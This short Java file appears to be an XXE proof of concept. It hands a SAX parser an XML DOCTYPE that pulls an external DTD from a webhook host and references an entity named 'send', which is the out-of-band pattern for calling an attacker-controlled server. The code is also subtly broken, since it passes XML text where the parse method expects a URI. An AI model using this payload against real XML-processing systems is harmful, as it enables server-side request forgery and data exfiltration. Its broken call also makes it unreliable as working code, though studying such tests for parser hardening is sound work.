package org.example;

import org.xml.sax.SAXException;
import org.xml.sax.XMLReader;
import org.xml.sax.helpers.XMLReaderFactory;

import java.io.IOException;

public class XRFandSAX {
    public static void main(String[] args) throws SAXException, IOException {
        XMLReader parser = XMLReaderFactory.createXMLReader("org.apache.xerces.parsers.SAXParser");
        parser.parse("<!DOCTYPE root SYSTEM \"https://webhook.uutool.cn/4pssarcu0pe0\">\n" +
                "<root>&send;</root>");
    }
}
